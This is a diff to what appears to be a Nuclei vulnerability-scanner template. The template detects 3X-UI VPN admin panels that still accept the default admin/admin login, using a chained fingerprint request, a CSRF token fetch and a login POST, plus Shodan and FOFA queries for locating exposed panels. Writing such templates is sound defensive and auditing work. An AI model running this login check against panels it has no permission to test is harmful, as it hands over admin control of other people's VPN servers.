@@ -5,55 +5,78 @@ info:
   author: mapioe
   severity: high
   description: |
-    3X-UI contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    Detected 3X-UI contains default credentials admin/admin. An attacker can obtain access to the admin panel and manage VPN configurations, modify data, and execute unauthorized operations.
   reference:
     - https://github.com/MHSanaei/3x-ui
     - https://github.com/MHSanaei/3x-ui/wiki/Installation
   classification:
     cwe-id: CWE-798
-    cpe: 2.3:a:mhsanaei:3x-ui:*:*:*:*:*:*:*:*
+    cpe: cpe:2.3:a:mhsanaei:3x-ui:*:*:*:*:*:*:*:*
   metadata:
     verified: true
+    max-request: 3
     fofa-query: app="3x-ui"
-    shodan-query: 3x-ui http.title:"Sign in"
+    shodan-query: http.title:"3x-ui"
     product: 3x-ui
-    vendor: MHSanaei
-    tags: 3x-ui,default-login
+    vendor: mhsanaei
+  tags: 3x-ui,default-login
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2) && http(3)
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/csrf-token"
-    extractors:
-      - type: json
-        part: body
-        name: csrf-token
-        json:
-          - ".obj"
-        internal: true
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
 
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-
-    headers:
-      content-type: application/x-www-form-urlencoded
-      x-csrf-token: "{{csrf-token}}"
-
-    body: "username={{username}}&password={{password}}"
-
-    attack: pitchfork
-    payloads:
-      username:
-        - "admin"
-      password:
-        - "admin"
+    host-redirects: true
+    max-redirects: 3
 
     matchers:
       - type: dsl
         dsl:
-          - 'contains(http_1_body, "\"success\":true")'
-          - 'contains_all(http_2_body, "\"success\":true", "msg\":")'
-          - "contains(http_2_header, 'application/json')"
-          - "http_2_status_code == 200"
+          - 'status_code == 200'
+          - 'contains_any(body, "X_UI_BASE_PATH", "<title>3x-ui")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /csrf-token HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "success")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: json
+        name: csrftoken
+        json:
+          - ".obj"
+        internal: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Csrf-Token: {{csrftoken}}
+
+        username={{username}}&password={{password}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"success\":true", "msg")'
         condition: and
